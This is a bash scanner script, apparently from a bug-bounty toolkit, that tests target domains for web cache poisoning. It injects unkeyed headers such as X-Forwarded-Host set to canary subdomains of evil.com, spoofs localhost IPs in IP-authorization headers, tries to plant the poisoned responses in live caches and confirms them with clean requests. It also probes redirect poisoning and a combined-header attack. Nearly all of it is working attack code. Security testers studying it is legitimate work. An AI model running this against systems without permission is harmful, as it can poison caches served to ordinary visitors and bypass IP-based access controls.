#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  ct_cache_poison.sh — Web Cache Poisoning                    ║
# ║  Test unkeyed headers for reflection + cache persistence     ║
# ║  Confirm poison with clean request canary detection          ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="ct_cache_poison.sh"
SCRIPT_DESC="Web Cache Poisoning"

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test unkeyed headers for reflection and verify if poisoned"
    echo "  responses are served to subsequent clean requests."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  --domains FILE         File with domains (one per line)"
    echo "  -u, --urls FILE        File with URLs to test (one per line)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "2" "$SCRIPT_DESC"

if [ -z "${DOMAIN:-}" ] && [ -z "${DOMAINS_FILE:-}" ] && [ -z "${URLS_FILE:-}" ]; then
    err "Provide --domain, --domains, or --urls"
    script_usage
    exit 1
fi

# ── Build target URL list ─────────────────────────────────────
TARGET_URLS="${OUT_DIR}/_ct_poison_targets.txt"
> "$TARGET_URLS"

# Cacheable test paths
CACHEABLE_PATHS=("/" "/robots.txt" "/favicon.ico" "/about" "/index.html" "/sitemap.xml" "/contact")

if [ -n "${URLS_FILE:-}" ] && [ -f "$URLS_FILE" ]; then
    head -50 "$URLS_FILE" >> "$TARGET_URLS"
fi

# Add cacheable paths for each domain
build_domain_urls() {
    local domain="$1"
    for path in "${CACHEABLE_PATHS[@]}"; do
        echo "https://${domain}${path}" >> "$TARGET_URLS"
    done
}

if [ -n "${DOMAINS_FILE:-}" ] && [ -f "$DOMAINS_FILE" ]; then
    while IFS= read -r d; do
        [ -z "$d" ] && continue
        d=$(echo "$d" | sed 's/\*\.//')
        build_domain_urls "$d"
    done < "$DOMAINS_FILE"
elif [ -n "${DOMAIN:-}" ]; then
    build_domain_urls "$(echo "$DOMAIN" | sed 's/\*\.//')"
fi

sort -u -o "$TARGET_URLS" "$TARGET_URLS"
url_count=$(count_lines "$TARGET_URLS")
info "Testing ${url_count} URLs for cache poisoning"

# ── Output file ───────────────────────────────────────────────
FINDINGS_FILE="${OUT_DIR}/ct_cache_poison_findings.txt"
> "$FINDINGS_FILE"

# ── Unique canary prefix for this run ─────────────────────────
RUN_ID="cptest$(date +%s)"

# ── Unkeyed headers to test ───────────────────────────────────
# Each entry: HEADER_NAME::POISON_VALUE_TEMPLATE
# {CANARY} will be replaced with unique canary per test
POISON_HEADERS=(
    "X-Forwarded-Host::{CANARY}.evil.com"
    "X-Forwarded-Scheme::nothttps"
    "X-Forwarded-Proto::nothttps"
    "X-Forwarded-Port::1337"
    "X-Forwarded-Prefix::/{CANARY}"
    "X-Original-URL::/{CANARY}"
    "X-Rewrite-URL::/{CANARY}"
    "X-Forwarded-For::127.0.0.{CANARY_NUM}"
    "X-Real-IP::127.0.0.{CANARY_NUM}"
    "X-Host::{CANARY}.evil.com"
    "X-Original-Host::{CANARY}.evil.com"
    "X-Forwarded-Server::{CANARY}.evil.com"
    "X-Custom-IP-Authorization::127.0.0.1"
    "True-Client-IP::127.0.0.1"
    "X-Azure-Ref::{CANARY}"
    "X-Client-IP::127.0.0.{CANARY_NUM}"
    "Fastly-Client-IP::127.0.0.{CANARY_NUM}"
    "CF-Connecting-IP::127.0.0.{CANARY_NUM}"
)

# ── Helper: test a single header for reflection + cache poison ─
# Returns: 0 if reflected, 1 if not
test_poison_header() {
    local url="$1"
    local header_name="$2"
    local canary="$3"
    local poison_value="$4"
    local cache_buster="$5"

    # Step 1: Send request WITH poison header AND cache buster to avoid tainting
    local probe_url="${url}$(echo "$url" | grep -q '?' && echo '&' || echo '?')_cb=${cache_buster}"
    local resp1
    resp1=$(curl -sk --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -H "${header_name}: ${poison_value}" \
        -D- "$probe_url" 2>/dev/null || echo "")

    if [ -z "$resp1" ]; then
        return 1
    fi

    # Check if canary is reflected in headers or body
    local resp1_headers resp1_body
    resp1_headers=$(echo "$resp1" | sed '/^\r$/q')
    resp1_body=$(echo "$resp1" | sed '1,/^\r$/d')

    local reflected=0
    local reflect_location=""

    if echo "$resp1_headers" | grep -qi "${canary}"; then
        reflected=1
        reflect_location="HEADER"
    fi
    if echo "$resp1_body" | grep -qi "${canary}"; then
        reflected=1
        if [ "$reflect_location" = "HEADER" ]; then
            reflect_location="HEADER+BODY"
        else
            reflect_location="BODY"
        fi
    fi

    if [ "$reflected" -eq 0 ]; then
        return 1
    fi

    echo "[REFLECTED] ${url} | Header: ${header_name} | Canary: ${canary} | Location: ${reflect_location}" >> "$FINDINGS_FILE"
    log "  ${YELLOW}[REFLECTED]${NC} ${url} via ${header_name} in ${reflect_location}"

    # Step 2: Try to poison the cache — send WITHOUT cache buster
    # Use unique path suffix to avoid poisoning real pages
    local poison_path="${url}$(echo "$url" | grep -q '?' && echo '&' || echo '?')_pt=${canary}"
    curl -sk -o /dev/null --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -H "${header_name}: ${poison_value}" \
        "$poison_path" 2>/dev/null || true

    # Step 3: Wait for cache to store
    sleep 1

    # Step 4: Send CLEAN request (no poison header) to same URL
    local resp2
    resp2=$(curl -sk --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        "$poison_path" 2>/dev/null || echo "")

    if [ -z "$resp2" ]; then
        return 0
    fi

    # Step 5: Check if canary persists in clean response = CACHE POISONED
    if echo "$resp2" | grep -qi "${canary}"; then
        echo "[CRITICAL] CACHE POISONED: ${url} | Header: ${header_name} | Canary: ${canary} | Location: ${reflect_location}" >> "$FINDINGS_FILE"
        warn "  ${RED}[CRITICAL] CACHE POISONED${NC}: ${url} via ${header_name}"
        return 0
    fi

    return 0
}

# ── Test redirect-based poisoning ─────────────────────────────
test_redirect_poison() {
    local url="$1"
    local header_name="$2"
    local canary="$3"
    local poison_value="$4"

    # Some cache poisoning manifests as redirect to attacker domain
    local resp
    resp=$(curl -sk -D- -o /dev/null --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -H "${header_name}: ${poison_value}" \
        "$url" 2>/dev/null || echo "")

    [ -z "$resp" ] && return 1

    local status
    status=$(echo "$resp" | head -1 | grep -oP '\d{3}' | head -1)

    if [[ "$status" =~ ^(301|302|303|307|308)$ ]]; then
        local location
        location=$(echo "$resp" | grep -i '^location:' | head -1 | sed 's/^[^:]*:[[:space:]]*//' | tr -d '\r')
        if echo "$location" | grep -qi "${canary}"; then
            echo "[HIGH] REDIRECT POISON: ${url} | Header: ${header_name} | Redirects to: ${location}" >> "$FINDINGS_FILE"
            warn "  ${RED}[HIGH] REDIRECT POISON${NC}: ${url} via ${header_name} -> ${location}"
        fi
    fi
}

# ── Main poisoning loop ──────────────────────────────────────
tested=0
reflected=0
poisoned=0

while IFS= read -r url; do
    [ -z "$url" ] && continue
    ((tested++)) || true

    # Quick liveness check
    http_code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" "$url" 2>/dev/null || echo "000")
    if [ "$http_code" = "000" ]; then
        continue
    fi

    info "[${tested}/${url_count}] Testing: ${url} (HTTP ${http_code})"

    header_idx=0
    for entry in "${POISON_HEADERS[@]}"; do
        header_name="${entry%%::*}"
        value_template="${entry##*::}"
        ((header_idx++)) || true

        # Generate unique canary per header test
        canary="${RUN_ID}h${header_idx}u${tested}"
        canary_num=$((RANDOM % 200 + 1))
        cache_buster="${canary}cb"

        # Replace template placeholders
        poison_value="${value_template//\{CANARY\}/$canary}"
        poison_value="${poison_value//\{CANARY_NUM\}/$canary_num}"

        # Test reflection + cache persistence
        if test_poison_header "$url" "$header_name" "$canary" "$poison_value" "$cache_buster"; then
            :
        fi

        # Test redirect-based poisoning for host-like headers
        case "$header_name" in
            X-Forwarded-Host|X-Host|X-Original-Host|X-Forwarded-Server)
                test_redirect_poison "$url" "$header_name" "$canary" "${canary}.evil.com"
                ;;
            X-Forwarded-Scheme|X-Forwarded-Proto)
                test_redirect_poison "$url" "$header_name" "$canary" "nothttps"
                ;;
        esac
    done

    # ── Test multiple headers combined ──
    combo_canary="${RUN_ID}combo${tested}"
    resp_combo=$(curl -sk --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -H "X-Forwarded-Host: ${combo_canary}.evil.com" \
        -H "X-Forwarded-Scheme: nothttps" \
        -H "X-Forwarded-Proto: nothttps" \
        "$url" 2>/dev/null || echo "")
    if echo "$resp_combo" | grep -qi "${combo_canary}"; then
        echo "[REFLECTED] ${url} | Combined: X-Forwarded-Host+Scheme+Proto | Canary: ${combo_canary}" >> "$FINDINGS_FILE"
        log "  ${YELLOW}[REFLECTED]${NC} ${url} via combined X-Forwarded-Host+Scheme+Proto"
    fi

done < "$TARGET_URLS"

# ── Cleanup ───────────────────────────────────────────────────
rm -f "$TARGET_URLS"

# ── Summary ───────────────────────────────────────────────────
if [ -s "$FINDINGS_FILE" ]; then
    sort -u -o "$FINDINGS_FILE" "$FINDINGS_FILE"
fi
finding_count=$(count_lines "$FINDINGS_FILE")
critical_count=$(grep -c '^\[CRITICAL\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
high_count=$(grep -c '^\[HIGH\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
reflected_count=$(grep -c '^\[REFLECTED\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)

log "Cache poisoning: ${finding_count} total findings"
log "  CRITICAL (confirmed cache poison): ${critical_count}"
log "  HIGH (redirect poison):            ${high_count}"
log "  REFLECTED (unkeyed reflection):     ${reflected_count}"
if [ "$critical_count" -gt 0 ] || [ "$high_count" -gt 0 ]; then
    warn "Exploitable cache poisoning detected — review findings for PoC"
fi
log "Results: ${FINDINGS_FILE}"
